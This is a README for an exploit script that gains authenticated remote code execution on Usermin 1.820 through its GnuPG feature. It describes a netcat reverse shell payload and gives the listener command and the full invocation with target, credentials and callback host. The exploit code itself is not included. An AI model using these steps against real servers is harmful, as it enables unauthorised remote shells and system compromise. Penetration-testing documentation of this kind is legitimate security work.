# Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)

## Description
This repository contains an exploit script for **Usermin 1.820** (and possibly earlier versions) that enables remote code execution (RCE) after successful authentication. I rewrote this script from scratch to address issues with existing commands that didn't function properly. This script allows for flexible user input and is shared to help others who may need a working exploit for educational or ethical penetration testing purposes.

## Features
- **Authenticated RCE**: Executes arbitrary commands on the target system after successful authentication.
- **Dynamic Input**: Allows specification of `lhost` and `lport` parameters for reverse shell payload configuration.
- **Detailed Logging**: Provides informative messages at each step to indicate success or failure.
- **Error Handling**: Includes basic error handling and checks to ensure smooth execution.

## Technical Explanation
The script performs the following steps:
1. **Establishes a Session**: Connects to the target Usermin instance over HTTPS on port 20000.
2. **Authenticates**: Logs in using the provided username and password.
3. **Injects Payload**: Uses GnuPG functionality to create a payload that triggers a reverse shell to the specified `lhost` and `lport`.
4. **Executes Command**: Fetches and manipulates the key list to execute the payload, resulting in a shell connection back to the attacker.

### Key Components:
- **`argparse` Module**: Used to take user inputs for `host`, `login`, `password`, `lhost`, and `lport`.
- **`requests` Module**: Handles HTTP(S) requests to the target.
- **Reverse Shell Payload**: Constructs and sends a netcat-based payload to establish a shell connection.

## Usage
Ensure you have the required credentials and network setup before running the script.

### Steps:
1. **Set up a listener** on your attacking machine:
   ```bash
   nc -nlvp 1337
   ```

2. **Run the exploit** with the appropriate parameters:
   ```bash
   python3 usermin.py --host <TARGET_IP> --login <USERNAME> --password <PASSWORD> --lhost <YOUR_LHOST> --lport <YOUR_LPORT>
   ```

### Example:
```bash
python3 usermin.py --host 192.168.1.10 --login admin --password password123 --lhost 192.168.45.192 --lport 1337
```

## Requirements
- **Python 3**
- **`requests` library**: Ensure it is installed (`pip install requests`).
- **Netcat**: Used for listening on the attacker's machine.

## Disclaimer
This exploit is provided for educational purposes and ethical penetration testing only. Unauthorized use on systems without the owner's consent is illegal and could result in severe consequences. Use responsibly and ensure you have permission before testing any system.
